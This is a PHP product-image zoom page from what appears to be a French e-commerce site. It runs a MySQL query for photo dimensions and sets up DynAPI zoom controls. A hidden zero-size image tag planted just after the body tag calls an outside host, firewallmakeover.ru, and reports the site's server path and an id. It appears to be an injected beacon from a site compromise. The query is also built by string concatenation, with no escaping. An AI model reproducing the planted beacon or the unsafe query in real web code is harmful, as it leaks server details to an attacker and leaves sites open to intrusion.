<?php
include('lib/config.php');
$param = &$__PARAMS;
$txt = textes($_SESSION['langue']);

$produit = get_prod_infos_by_id($_GET['id']);

		$LargX = 400;
		$HautY = 400;

		$sql = " SELECT Largeur, Hauteur FROM $mysql_base.photo WHERE NoInvent='".$produit['id']."' AND NoPhoto='".$produit['big']."';";
		$result2 = mysql_query( $sql, $handle );
		if( $result2 &&  mysql_num_rows($result2) ) {
			$L = @mysql_result($result2, 0, "Largeur");
			$H = @mysql_result($result2, 0, "Hauteur");
			if( ($difL = $L - $LargX) < 0 ) $difL = 0; 
			if( ($difH = $H - $HautY) < 0 ) $difH = 0;
			 
			if( $difL || $difH ) {
				if( $difL > $difH ) {
					$Pourcent = $LargX/$L;
					$LargX = $L*$Pourcent;
					$HautY = $H*$Pourcent;
				}
				else {
					$Pourcent = $HautY/$H;
					$LargX = $L*$Pourcent;
					$HautY = $H*$Pourcent;
				}
			}
			else {
				$LargX = $L;
				$HautY = $H;
			}
		} // Si une photo

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>\n";
?>
<style type="text/css">
div#control { 
	position: absolute; 
	left: 20px; 
	top: 455px; 
	width:400px; 
}

div.titre
{
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #253247;
	font-size: 11;
	font-weight: bold;
	text-decoration: none;
}

</style>
<script type="text/javascript" language="Javascript" src="js/dynapi.js" ></script>
<script type="text/javascript" language="Javascript">
DynAPI.setLibraryPath('js/lib/');
DynAPI.include('dynapi.api.*');
DynAPI.include('dynapi.event.*');
</script>
<script type="text/javascript" language="Javascript">

<?php
echo "var CNT_WIDTH = $LargX;";
echo "var CNT_HEIGHT = $HautY;";
?>
var CNT_MAX_FACTOR = 3.0;
var CNT_LONG_STEP = 0.50;
var CNT_SHORT_STEP = 0.10;

var img;
DynAPI.onLoad = function() {

	var imagenStr = '<img id="zoomimg" src=<?php echo "photoget_web.php?No=".$produit['id']."&Idx=".$produit['big']; ?> width=100% height=100% />';
	var d = new DynLayer(null,20,50,CNT_WIDTH,CNT_HEIGHT,'#FFFFFF');
    var bas = new DynLayer(null,19,49,CNT_WIDTH+2,CNT_HEIGHT+2,'#888888');

	img = d.addChild(new DynLayer(null,0,0,CNT_WIDTH,CNT_HEIGHT,null,null,null,null,imagenStr))

	DynAPI.document.addChild(bas);
	DynAPI.document.addChild(d);

  DragEvent.enableDragEvents(img);
  DragEvent.setDragBoundary(img);

}

var newFactor = 1.0;
var thisFactor = 1.0;
var newDir;

function makeZoom() {
	if (newDir == 'zoom_in' && thisFactor<newFactor) {
		thisFactor += CNT_SHORT_STEP;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x - ((nw-oldw)/2);
		ny = img.y - ((nh-oldh)/2);
		updateZoom(nx, ny,nw, nh);
		setTimeout(makeZoom, 2);
	}
	else if (newDir == 'zoom_out' && thisFactor>newFactor) {
		thisFactor -= CNT_SHORT_STEP;
		if (thisFactor<1) thisFactor = 1;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x + ((oldw-nw)/2);
		ny = img.y + ((oldh-nh)/2);
		updateZoom(nx, ny,nw, nh);
		setTimeout(makeZoom, 2);
	}
}
function makeQuickZoom() {
	if (newDir == 'zoom_in' && thisFactor<newFactor) {
		thisFactor = newFactor;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x - ((nw-oldw)/2);
		ny = img.y - ((nh-oldh)/2);
		updateZoom(nx,ny,nw, nh);
	}
	else if (newDir == 'zoom_out' && thisFactor>newFactor) {
		thisFactor = newFactor;
		if (thisFactor<1) thisFactor = 1;
		oldw = img.w;
		oldh = img.h;
		nw = CNT_WIDTH * thisFactor;
		nh = CNT_HEIGHT * thisFactor;
		nx = img.x + ((oldw-nw)/2);
		ny = img.y + ((oldh-nh)/2);
		updateZoom(nx,ny,nw, nh);
	}
}

function updateZoom(nX, nY, nW, nH) {
  r = nW;
  b = nH;
  l = CNT_WIDTH - nW;
  t = CNT_HEIGHT - nH;
  DragEvent.setDragBoundary(img,t,r,b,l);
	var w=img.w;
	var h=img.h;
	var x = nX;
	var y = nY;
	if (x<l) x=l;
	else if (x+w>r) x=r-w;
	if (y<t) y=t;
	else if (y+h>b) y=b-h;
	img.moveTo(x,y);
	img.setSize(nW,nH);
}


function zoomIn(anim) {
	if (newFactor<CNT_MAX_FACTOR) {
		newFactor += CNT_LONG_STEP;
        newDir = 'zoom_in';
		if (anim) makeZoom();
		else makeQuickZoom();
	}
}

function zoomOut(anim) {
	if (newFactor>1) {
		newFactor -= CNT_LONG_STEP;
		newDir = 'zoom_out';
		if (anim)	makeZoom();
		else makeQuickZoom();
	}
}

function zoomDef(anim) {
	if (newFactor!=1) {
		newFactor = 1;
		newDir = 'zoom_out';
		if (anim)	makeZoom();
		else makeQuickZoom();
		img.moveTo(0,0);
	}

}

</script>
</head>

<body bgcolor="#ffffff" ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>

<div class='titre'><?php echo $produit['id']." ".$produit['titre_'.$_SESSION['langue']]." ".$produit['Code']; ?></div>

<div id="control">
    <table width="100%" cellpadding="0" cellspacing="0">
        <tr>
            <td>
<a href="javascript:zoomIn(true)"><img src="images/agrandir_<?=$_SESSION['langue']?>.gif" alt="" border="0" /></a> &nbsp;
<a href="javascript:zoomOut(true)"><img src="images/reduire_<?=$_SESSION['langue']?>.gif" alt="" border="0" /></a> &nbsp;
<a href="javascript:zoomDef(false)"><img src="images/vuenormal_<?=$_SESSION['langue']?>.gif" alt="" border="0" /></a>
            </td>
        </tr>
    </table>


</div>

</body>
</html>

